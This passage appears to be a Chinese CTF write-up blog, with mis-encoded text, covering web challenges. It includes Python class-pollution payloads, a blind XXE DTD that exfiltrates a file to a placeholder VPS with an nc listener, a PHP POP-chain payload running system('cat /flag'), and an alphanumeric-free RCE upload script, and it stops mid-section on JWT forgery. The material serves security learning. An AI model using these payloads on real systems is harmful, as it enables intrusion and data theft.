class="line">/polluteï¼šå°†æ”¶åˆ°çš„jsonæ ¼å¼æ•°æ®å½“ä½œå‚æ•°ï¼Œæ‰§â¾â¾ƒå®šä¹‰å‡½æ•°merge(),å¹¶ä¸”å›æ˜¾æ˜¯å¦æ‰§â¾æˆåŠŸã€‚</span><br></pre></td></tr></table></figure><p>åˆ™æœ‰ä¸¤ç§æ±¡æŸ“è·å¾—flagçš„æ–¹æ³•ï¼Œè¦ä¹ˆå°†catå’Œdogå…¶ä¸­ä¸€ä¸ªè¿›è¡Œæ±¡æŸ“ä½¿å…¶ç›¸ç­‰ï¼Œè¦ä¹ˆå°†fileæ±¡æŸ“æˆflagç›´æ¥è¯»å‡ºæ¥,ç„¶åè®¿é—®&#x2F;flagæˆ–è€…&#x2F;srcå°±å¥½äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">             &quot;__file__&quot; : &quot;/flag&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">              &quot;dog&quot; : &quot;where is the flag?&quot;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®˜pçš„è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def fetch_flag(base_url, pollute_data):</span><br><span class="line">    try:</span><br><span class="line">        # å‘é€POSTè¯·æ±‚åˆ°/polluteè·¯ç”±</span><br><span class="line">        pollute_response = requests.post(</span><br><span class="line">            f&quot;&#123;base_url&#125;/pollute&quot;,</span><br><span class="line">            json=pollute_data,</span><br><span class="line">            headers=&#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;</span><br><span class="line">        )</span><br><span class="line">        print(f&quot;Polluteè¯·æ±‚çŠ¶æ€ç : &#123;pollute_response.status_code&#125;&quot;)</span><br><span class="line">        pollute_response.raise_for_status()</span><br><span class="line">        </span><br><span class="line">        # è¯·æ±‚flagè·¯ç”±</span><br><span class="line">        flag_response = requests.get(f&quot;&#123;base_url&#125;/flag&quot;)</span><br><span class="line">        print(f&quot;Flagè¯·æ±‚çŠ¶æ€ç : &#123;flag_response.status_code&#125;&quot;)</span><br><span class="line">        flag_response.raise_for_status()</span><br><span class="line">        </span><br><span class="line">        # æå–flag</span><br><span class="line">        content = flag_response.text</span><br><span class="line">        match = re.search(r&#x27;flag\&#123;.*?\&#125;&#x27;, content)</span><br><span class="line">        if match:</span><br><span class="line">            return match.group()</span><br><span class="line">        else:</span><br><span class="line">            return &quot;æœªæ‰¾åˆ°flagç‰¹å¾å­—ç¬¦ä¸²&quot;</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        return f&quot;è¯·æ±‚å‘â½£é”™è¯¯: &#123;str(e)&#125;&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return f&quot;å‘â½£é”™è¯¯: &#123;str(e)&#125;&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    BASE_URL = &quot;http://challenge.ilovectf.cn:30462&quot;</span><br><span class="line">    POLLUTE_DATA = &#123;</span><br><span class="line">        &quot;__init__&quot; : &#123;</span><br><span class="line">            &quot;__globals__&quot; : &#123;</span><br><span class="line">                &quot;dog&quot; : &quot;where is the flag?&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = fetch_flag(BASE_URL, POLLUTE_DATA)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110171734186.png" alt="image-20251110171734186"></p><h3 id="Look-at-the-picture"><a href="#Look-at-the-picture" class="headerlink" title="Look at the picture"></a><strong>Look at the picture</strong></h3><h4 id="è€ƒç‚¹ï¼šphpä¼ªåè®®"><a href="#è€ƒç‚¹ï¼šphpä¼ªåè®®" class="headerlink" title="è€ƒç‚¹ï¼šphpä¼ªåè®®"></a>è€ƒç‚¹ï¼šphpä¼ªåè®®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½ æƒ³çœ‹ä»€ä¹ˆå›¾ç‰‡éƒ½è¡Œï¼Œä½†åªèƒ½æ˜¯httpåè®®å“¦~ ä¸è¦å·å·ç”¨å…¶å®ƒçš„</span><br></pre></td></tr></table></figure><p>ç›®å½•æ‰«æåˆ°<a href="http://www.zip/">www.zip</a></p><p><img src="/../images/image-20251110173244488.png" alt="image-20251110173244488"></p><p>æŸ¥çœ‹æºç æœ‰file_get_contentsçš„ä»»æ„â½‚ä»¶è¯»å–æ¼æ´ï¼Œè¿˜æœ‰é»‘åå•é™åˆ¶å…³é”®è¯</p><p><img src="/../images/image-20251110173605876.png" alt="image-20251110173605876"></p><p>ç”¨php:&#x2F;&#x2F;filteræ¥è¿›è¡Œå¯¹é»‘åå•çš„ç»•è¿‡</p><p><img src="/../images/image-20251110174127984.png" alt="image-20251110174127984"></p><p>å®˜æ–¹é¢˜è§£å½“ä¸­è¯´äº†ï¼Œå¸¸â½¤çš„base64å’Œstringè¢«banäº†ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„è¿‡æ»¤å™¨è¿›è¡Œç»•è¿‡ä¹Ÿokï¼Œè®°ä¸‹æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;æºç¼–ç &gt;.&lt;â½¬æ ‡ç¼–ç &gt;</span><br><span class="line">è¿™ä¸ªè¿‡æ»¤å™¨å¯ä»¥è¿›â¾ä»»æ„å­—ç¬¦ç¼–ç ä¹‹é—´çš„è½¬æ¢</span><br></pre></td></tr></table></figure><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="æŸ¥æŸ¥å¿†"><a href="#æŸ¥æŸ¥å¿†" class="headerlink" title="æŸ¥æŸ¥å¿†"></a><strong>æŸ¥æŸ¥å¿†</strong></h3><h4 id="è€ƒç‚¹ï¼šæ— å›æ˜¾xxe"><a href="#è€ƒç‚¹ï¼šæ— å›æ˜¾xxe" class="headerlink" title="è€ƒç‚¹ï¼šæ— å›æ˜¾xxe"></a>è€ƒç‚¹ï¼šæ— å›æ˜¾xxe</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥ä¸€æŸ¥å…³äºXMLçš„å›å¿†</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Libra1313/article/details/149851715?spm=1001.2101.3001.10752</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110224850936.png" alt="image-20251110224850936"></p><p>è¯»å–è¯¥flagæ–‡ä»¶ï¼Œæ— å›æ˜¾åŠ è½½å¤–éƒ¨dtdæ–‡ä»¶</p><p>æ­£å¸¸æ¥è¯´åœ¨vpsä¸Šæ”¾dtdæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///f1111llllaa44g&quot;&gt;</span><br><span class="line">&lt;!ENTITY % code &quot;&lt;!ENTITY % send SYSTEM &#x27;http://xx.xx.xx.xx/:11111?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå¯¹è¿‡æ»¤è¯è¿›è¡Œç¼–ç ç»•è¿‡</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xx.xx.xx.xx/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %dtd;%code;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?&gt;</span><br><span class="line">+ADwAIQ-DOCTYPE a +AFs</span><br><span class="line">    +ADwAIQ-ENTITY +ACU dtd SYSTEM +ACI-http://xx.xx.xx.xx/xxe.dtd+ACIAPg</span><br><span class="line">    +ACU-dtd+ADsAJQ-code+ADsAJQ-send+ADs</span><br><span class="line">+AF0APg-</span><br></pre></td></tr></table></figure><p>ç„¶åvpså¼€å¯11111ç«¯å£ï¼ŒæŸ¥è¯¢å£è¾“å…¥payloadå³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 11111</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¤ç°çš„æ˜¯ä¸€ç›´å¸¦å¤–ä¸äº†ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><h3 id="é­”æœ¯å¤§æ‚çƒ©"><a href="#é­”æœ¯å¤§æ‚çƒ©" class="headerlink" title="é­”æœ¯å¤§æ‚çƒ©"></a><strong>é­”æœ¯å¤§æ‚çƒ©</strong></h3><h4 id="è€ƒç‚¹ï¼šPHPååºåˆ—åŒ–çš„POPé“¾"><a href="#è€ƒç‚¹ï¼šPHPååºåˆ—åŒ–çš„POPé“¾" class="headerlink" title="è€ƒç‚¹ï¼šPHPååºåˆ—åŒ–çš„POPé“¾"></a>è€ƒç‚¹ï¼šPHPååºåˆ—åŒ–çš„POPé“¾</h4><p>ç»™çš„åŸºç¡€çŸ¥è¯†ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;__get():åœ¨å¯¹è±¡ä¸­è°ƒâ½¤â¼€ä¸ªä¸å¯è®¿é—®çš„æˆ–ä¸å­˜åœ¨çš„å˜é‡æ—¶è§¦å‘ï¼Œå’Œç¬¦å·&quot;&amp;æœ‰å…³ã€‚&quot;__get($key)çš„$keyæ˜¯ä½ è§¦å‘&quot;__get()æ—¶è®¿é—®çš„é‚£ä¸ªä¸å­˜åœ¨çš„å˜é‡ã€‚</span><br><span class="line">&quot;__call()ï¼šåœ¨å¯¹è±¡ä¸­è°ƒâ½¤â¼€ä¸ªä¸å­˜åœ¨çš„â½…æ³•æ—¶â¾ƒåŠ¨è°ƒâ½¤è¿™ä¸ªâ½…æ³•ï¼Œå’Œç¬¦å·&quot;&amp;æœ‰å…³ã€‚&quot;__call($name,$arg)çš„$nameå’Œ$argæ˜¯è§¦å‘æ—¶è°ƒâ½¤çš„â½…æ³•åå’Œå‚æ•°ã€‚</span><br><span class="line">&quot;__toString()ï¼šå½“â¼€ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²è¾“å‡ºæˆ–ä½¿â½¤æ—¶è§¦å‘ï¼Œèƒ½è§¦å‘çš„å…³é”®å­—æœ‰echoï¼Œæ­£åˆ™å‡½æ•°ï¼ˆä¼šè¿›â¾ç±»å‹è½¬æ¢ï¼‰ï¼Œä¸strtolower();ï¼Œdie();å’Œmd5();,sha1();ç­‰å‡½æ•°æœ‰å…³ã€‚ ç±»ä¼¼</span><br><span class="line">äº$this&quot;&amp;mimi&quot;&#x27;&#x27;nohajimi&#x27;;çš„èµ‹å€¼æ“ä½œä¹Ÿä¼šè§¦å‘ã€‚</span><br><span class="line">&quot;__invoke()ï¼šå½“â¼€ä¸ªå¯¹è±¡è¢«ä½œä¸ºå‡½æ•°è°ƒâ½¤æ—¶â¾ƒåŠ¨è°ƒâ½¤è¿™ä¸ªâ½…æ³•ï¼Œå’Œ()æœ‰å…³ã€‚</span><br><span class="line">&quot;__wakeup()ï¼šåœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åâ¾ƒåŠ¨è°ƒâ½¤è¿™ä¸ªâ½…æ³•ï¼Œå’Œunserializeå…³é”®å­—æœ‰å…³ã€‚</span><br><span class="line">&quot;__destruct()ï¼šå¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ï¼Œå¦‚åœ¨è„šæœ¬ç»“æŸæ—¶phpé€šå¸¸ä¼šè¿›â¾æ¸…ç†ï¼Œé€šå¸¸ä¼šè§¦å‘ææ„å‡½æ•°ã€‚</span><br><span class="line">&quot;__constract()ï¼šå¯¹è±¡è¢«åˆ›å»ºæ—¶è§¦å‘ï¼Œå’Œnewå…³é”®å­—æœ‰å…³ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é­”æœ¯å¸ˆPOPåšçš„å¤§æ‚çƒ©ï¼Œå‘³çœŸè¶³~</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Wuhuarou&#123;</span><br><span class="line">    public $Wuhuarou;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        echo &quot;Nice Wuhuarou!&lt;/br&gt;&quot;;</span><br><span class="line">        echo $this -&gt; Wuhuarou;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fentiao&#123;</span><br><span class="line">    public $Fentiao;</span><br><span class="line">    public $Hongshufentiao;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;Nice Fentiao!&lt;/br&gt;&quot;;</span><br><span class="line">        return $this -&gt; Fentiao -&gt; Hongshufentiao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Baicai&#123;</span><br><span class="line">    public $Baicai;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        echo &quot;Nice Baicai!&lt;/br&gt;&quot;;</span><br><span class="line">        $Baicai = $this -&gt; Baicai;</span><br><span class="line">        return $Baicai();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Wanzi&#123;</span><br><span class="line">    public $Wanzi;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        echo &quot;Nice Wanzi!&lt;/br&gt;&quot;;</span><br><span class="line">        return $this -&gt; Wanzi -&gt; Xianggu();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Xianggu&#123;</span><br><span class="line">    public $Xianggu;</span><br><span class="line">    public $Jinzhengu;</span><br><span class="line">    public function __construct($Jinzhengu)&#123;</span><br><span class="line">        $this -&gt; Jinzhengu = $Jinzhengu;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name, $arg)&#123;</span><br><span class="line">        echo &quot;Nice Xianggu!&lt;/br&gt;&quot;;</span><br><span class="line">        $this -&gt; Xianggu -&gt; Bailuobo = $this -&gt; Jinzhengu;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Huluobo&#123;</span><br><span class="line">    public $HuLuoBo;</span><br><span class="line">    public function __set($key,$arg)&#123;</span><br><span class="line">        echo &quot;Nice Huluobo!&lt;/br&gt;&quot;;</span><br><span class="line">        eval($arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;eat&#x27;]))&#123;</span><br><span class="line">    unserialize($_POST[&#x27;eat&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112203848732.png" alt="image-20251112203848732"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Wuhuarou</span><br><span class="line">&#123;</span><br><span class="line">    public $Wuhuarou;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Fentiao</span><br><span class="line">&#123;</span><br><span class="line">    public $Fentiao;</span><br><span class="line">    public $Hongshufentiao;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Baicai</span><br><span class="line">&#123;</span><br><span class="line">    public $Baicai;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Wanzi</span><br><span class="line">&#123;</span><br><span class="line">    public $Wanzi;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Xianggu</span><br><span class="line">&#123;</span><br><span class="line">    public $Xianggu;</span><br><span class="line">    public $Jinzhengu;</span><br><span class="line"></span><br><span class="line">    public function __construct($Jinzhengu)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;Jinzhengu = $Jinzhengu;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Huluobo</span><br><span class="line">&#123;</span><br><span class="line">    public $HuLuoBo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Wuhuarou();</span><br><span class="line">$a-&gt;Wuhuarou = new Fentiao();</span><br><span class="line">$a-&gt;Wuhuarou-&gt;Fentiao = new Baicai();</span><br><span class="line">$a-&gt;Wuhuarou-&gt;Fentiao-&gt;Baicai = new Wanzi();</span><br><span class="line">$a-&gt;Wuhuarou-&gt;Fentiao-&gt;Baicai-&gt;Wanzi = new Xianggu(&#x27;system(&quot;cat /flag&quot;);&#x27;);</span><br><span class="line">$a-&gt;Wuhuarou-&gt;Fentiao-&gt;Baicai-&gt;Wanzi-&gt;Xianggu = new Huluobo();</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><h3 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagå°±åœ¨flag.phpé‡Œï¼Œç«¥åŸæ— æ¬ºçš„å•¦</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹-phpéæ³•å‚æ•°åä¼ å‚-æ— å­—æ¯æ•°å­—rce-å‘½ä»¤æ‰§è¡Œé•¿åº¦é™åˆ¶ç»•è¿‡"><a href="#è€ƒç‚¹-phpéæ³•å‚æ•°åä¼ å‚-æ— å­—æ¯æ•°å­—rce-å‘½ä»¤æ‰§è¡Œé•¿åº¦é™åˆ¶ç»•è¿‡" class="headerlink" title="è€ƒç‚¹:phpéæ³•å‚æ•°åä¼ å‚,æ— å­—æ¯æ•°å­—rce,å‘½ä»¤æ‰§è¡Œé•¿åº¦é™åˆ¶ç»•è¿‡"></a>è€ƒç‚¹:phpéæ³•å‚æ•°åä¼ å‚,æ— å­—æ¯æ•°å­—rce,å‘½ä»¤æ‰§è¡Œé•¿åº¦é™åˆ¶ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code = $_GET[&#x27;c1n_y0.u g3t+fl&amp;g?&#x27;];</span><br><span class="line">if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">    die(&quot;hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(strlen($code)&gt;14)&#123;</span><br><span class="line">    die(&quot;is tooooooooooooooooooo long!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;Flag is in flag.php~~ (local).&quot;;</span><br><span class="line">@eval($code);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h4><p>éæ³•å˜é‡åï¼šphpç‰ˆæœ¬â¼©äº8ï¼Œå¦‚æœå‚æ•°ä¸­å‡ºç°ä¸­æ‹¬å·[ï¼Œä¸­æ‹¬å·ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿_ï¼Œå¦‚æœåâ¾¯è¿˜æœ‰â¾®æ³•å­—ç¬¦(. [ ç©ºæ ¼)ï¼Œåˆ™ä¸ä¼šè¢«ç»§ç»­è½¬æ¢æˆä¸‹åˆ’çº¿ï¼Œç¬¦å·æ³¨æ„urlç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c1n[y0.u%20g3t%2Bfl%26g?</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.qwesec.com/2024/03/noLettersOrNumbersRCE.html#%E6%80%9D%E8%B7%AF</span><br><span class="line">https://blog.csdn.net/q20010619/article/details/109206728</span><br></pre></td></tr></table></figure><p>å–ååŠ &#96;&#96;æ‰§è¡Œå‘½ä»¤åŠ å››å­—ç¬¦ç»•è¿‡é•¿åº¦é™åˆ¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c1n[y0.u%20g3t%2Bfl%26g?=$_=~%C1%9C%9E%8B;`$_`;</span><br><span class="line">?c1n[y0.u%20g3t%2Bfl%26g?=`*&gt;=`;</span><br></pre></td></tr></table></figure><h4 id="éé¢„æœŸè§£"><a href="#éé¢„æœŸè§£" class="headerlink" title="éé¢„æœŸè§£"></a>éé¢„æœŸè§£</h4><p>åœ¨åˆ«çš„å¸ˆå‚…ã€æœªçŸ¥çš„å¸ˆå‚…ã€‘é‚£é‡Œå­¦æ¥çš„æ–‡ä»¶ä¸Šä¼ å†™å…¥flagåˆ°txtä¸‹</p><p>run.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag.php &gt; 1.txt</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¼ æ–‡ä»¶åŒæ—¶ï¼Œæ‰§è¡Œ shell</span></span><br><span class="line">url = <span class="string">r&quot;http://challenge.ilovectf.cn:30590/?c1n%5By0.u%20g3t%2Bfl%26g%3F=`.+/*/*[@-[]`;&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">r&quot;D:\å¼ºåˆ¶æ–‡ä»¶ä¸Šä¼ \run.sh&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h3 id="MySQLç®¡ç†å·¥å…·"><a href="#MySQLç®¡ç†å·¥å…·" class="headerlink" title="MySQLç®¡ç†å·¥å…·"></a>MySQLç®¡ç†å·¥å…·</h3><h4 id="è€ƒç‚¹ï¼šJWTä¼ªé€ ï¼ŒMySQLä»»æ„æ–‡ä»¶è¯»å–æ¼æ´-py-yamlååºåˆ—åŒ–"><a href="#è€ƒç‚¹ï¼šJWTä¼ªé€ ï¼ŒMySQLä»»æ„æ–‡ä»¶è¯»å–æ¼æ´-py-yamlååºåˆ—åŒ–" class="headerlink" title="è€ƒç‚¹ï¼šJWTä¼ªé€ ï¼ŒMySQLä»»æ„æ–‡ä»¶è¯»å–æ¼æ´,py-yamlååºåˆ—åŒ–"></a>è€ƒç‚¹ï¼šJWTä¼ªé€ ï¼ŒMySQLä»»æ„æ–‡ä»¶è¯»å–æ¼æ´,py-yamlååºåˆ—åŒ–</h4><p><img src="/../images/image-20251111183656103.png" alt="image-20251111183656103"></p><p>æŸ¥çœ‹æºç å­˜åœ¨å¼±å£ä»¤ï¼Œç™»å½•ä¸Šå»å‘ç°æ˜¯ä¸€ä¸ªmysqlè¿æ¥é¡µé¢ï¼Œéšæ„è¾“å…¥å¯†ç æ˜¾ç¤ºæƒé™ä¸è¶³</p><p><img src="/../images/image-20251111183903444.png" alt="image-20251111183903444"></p><p>æŠ“åŒ…æŸ¥çœ‹æœ‰<strong>Authorization</strong>ï¼Œjwtå½¢å¼ï¼Œå…ˆå°è¯•çˆ†ç ´keyï¼Œç„¶åæ¥æ„é€ admin</p><p><img src="/../images/image-20251111222118644.png" alt="image-20251111222118644"></p><p><img src="/../images/image-20251111185058396.png" alt="image-20251111185058396"></p><p><img src="/../images/image-20251111185113746.png" alt="image-20251111185113746"></p><p>ä¼ªé€ 